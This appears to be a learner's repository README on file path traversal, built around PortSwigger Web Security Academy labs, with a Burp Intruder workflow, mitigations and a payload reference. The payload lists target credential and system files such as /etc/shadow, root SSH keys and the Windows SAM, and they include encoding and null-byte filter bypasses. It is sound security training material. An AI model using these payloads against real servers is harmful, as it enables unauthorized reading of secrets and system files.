# File Path Traversal

Welcome to my File Path Traversal learning repository based on the **PortSwigger Web Security Academy**.

This section documents my hands-on practice, including vulnerability analysis, traversal techniques, payloads, testing methods, Burp Suite workflows, and individual lab solutions.

## 1. What is File Path Traversal?

File Path Traversal, also known as Directory Traversal, is a vulnerability that allows an attacker to access files and directories outside the intended directory.

It occurs when an application uses user-controlled input to construct file paths without proper validation.

An attacker may manipulate file path parameters using directory traversal sequences such as:

```text
../../../etc/passwd
```

This can potentially allow access to sensitive files on the server.

## 2. How File Path Traversal Works

Applications often use parameters to retrieve files.

Example:

```http
GET /image?filename=1.jpg HTTP/1.1
```

The application uses the `filename` parameter to locate the requested image.

If the application does not properly validate the supplied filename, an attacker may manipulate the parameter to access files outside the intended directory.

Example:

```http
GET /image?filename=../../../../etc/passwd HTTP/1.1
```

The server may interpret the traversal sequences and access the requested file outside the image directory.

## 3. Common Testing Methodology

The following is the common workflow I follow while testing File Path Traversal vulnerabilities in PortSwigger Web Security Academy labs.

### Step 1: Access the Lab

1. Open the required PortSwigger lab.
2. Click **Access the Lab**.
3. Open the lab instance in the browser.

### Step 2: Identify the Image URL

1. Open the lab homepage.
2. Press `Ctrl + U` to inspect the page source.
3. Search for `image`.
4. Identify the image URL and its filename parameter.

Example:

```http
/image?filename=1.jpg
```

### Step 3: Capture the Request

1. Open the identified image URL.
2. Capture the request using Burp Suite Proxy.
3. Identify the `filename` parameter.
4. Send the request to Burp Intruder.

### Step 4: Configure Burp Intruder

1. Select the **Sniper** attack type.
2. Set the payload position around the image filename.
3. Select **Simple List** as the payload type.
4. Add the required traversal payloads.
5. Start the attack.

### Step 5: Analyze Attack Results

After the attack starts:

1. Compare the HTTP status codes.
2. Compare the response lengths.
3. Identify unusual response lengths.
4. Inspect the response body.
5. Verify whether the requested file contents are returned.

A successful response may contain sensitive file contents instead of the expected image.

**Important:** Response length and status code are indicators, not proof by themselves. Always inspect the response content to confirm the result.

### Step 6: Verify Lab Completion

Check the PortSwigger lab status.

If the lab displays **Solved**, capture the completion evidence.

---

## 4. File Path Traversal Payload Reference

The following payloads are maintained as a common reference for authorized lab testing.

### 4.1 Linux File Traversal Payloads

```text
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../etc/hostname
../../../../etc/issue
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../proc/self/cwd/index.php
../../../../proc/self/fd/0
../../../../root/.ssh/id_rsa
../../../../root/.bash_history
../../../../home/user/.bash_history
../../../../var/log/apache2/access.log
../../../../var/log/apache2/error.log
../../../../var/log/nginx/access.log
../../../../var/log/auth.log
../../../../var/log/vsftpd.log
../../../../var/mail/root
../../../../var/spool/cron/crontabs/root
```

### 4.2 Windows File Traversal Payloads

```text
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
..\..\..\..\inetpub\wwwroot\web.config
..\..\..\..\windows\repair\sam
..\..\..\..\windows\system32\config\sam
```

### 4.3 Non-recursive Traversal Bypass

```text
....//....//....//....//etc/passwd
```

### 4.4 URL-Encoded Traversal Payloads

```text
..%2f..%2f..%2f..%2fetc%2fpasswd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 4.5 Double URL-Encoded Traversal

```text
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 4.6 Legacy Encoding Variants

```text
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

..%c0%af..%c0%af..%c0%afetc/passwd
```

These are legacy encoding variants. Their behavior depends on the server and decoding implementation.

### 4.7 Null Byte Payloads

```text
../../../../etc/passwd%00

../../../../etc/passwd%00.jpg

../../../../etc/passwd%00.php
```

Null byte bypass behavior depends on the application, runtime and file-handling implementation.

---

## 5. Understanding Burp Intruder Results

When testing traversal payloads using Burp Intruder, examine the following:

| Field | Purpose |
|---|---|
| Payload | Identifies the tested traversal string |
| Status Code | Shows the HTTP response status |
| Response Length | Helps identify unusual responses |
| Response Body | Confirms whether the requested file was returned |

### Identifying a Successful Response

A successful response may show:

- An unusual response length.
- HTTP status `200 OK`.
- File contents instead of the expected image.
- Recognizable system file entries.

For example, `/etc/passwd` may contain:

```text
root:x:0:0:root:/root:/bin/bash
```

Always verify the response body rather than relying only on response length.

---

## 6. Individual Lab Documentation

| Lab | Topic | Status |
|---|---|---|
| Lab-01 | File Path Traversal – Simple Case | Completed |
| Lab-02 | Traversal Sequences Blocked with Absolute Path Bypass | Completed |
| Lab-03 | Traversal Sequences Stripped Non-recursively | Completed |
| Lab-04 | Traversal Sequences Stripped with Superfluous URL Decode | Completed |
| Lab-05 | Validation of Start of Path | Completed |
| Lab-06 | Validation of File Extension with Null Byte Bypass | Completed |

Individual lab folders contain the specific testing methodology, payloads, observations, evidence and results.

**Note:** Lab completion and repository documentation completion are tracked separately.

---

## 7. Security Impact

File Path Traversal vulnerabilities may allow attackers to:

- Read sensitive system files.
- Access application configuration files.
- Retrieve credentials stored in accessible files.
- Expose internal application information.
- Access files outside the intended directory.

The impact depends on application permissions and server configuration.

## 8. Prevention and Mitigation

Developers should:

1. Avoid using raw user input to construct file paths.
2. Use allowlists for permitted filenames.
3. Canonicalize and validate file paths.
4. Restrict file access to an intended directory.
5. Use secure file-handling APIs.
6. Apply least-privilege filesystem permissions.
7. Reject unexpected path separators and traversal sequences.
8. Avoid relying only on string filtering or blacklists.

## 9. Tools Used

- Burp Suite Professional
- Browser Developer Tools
- PortSwigger Web Security Academy

## 10. Learning Objectives

- Understand File Path Traversal vulnerabilities.
- Identify vulnerable file-handling parameters.
- Learn directory traversal techniques.
- Practice bypassing common path validation mechanisms.
- Use Burp Suite Proxy and Intruder for manual testing.
- Analyze HTTP responses to verify vulnerabilities.
- Understand security impact and mitigation techniques.

## 11. Disclaimer

All testing documented in this repository is performed in authorized PortSwigger Web Security Academy labs for educational purposes.

**Learning Platform:** https://portswigger.net/web-security/file-path-traversal
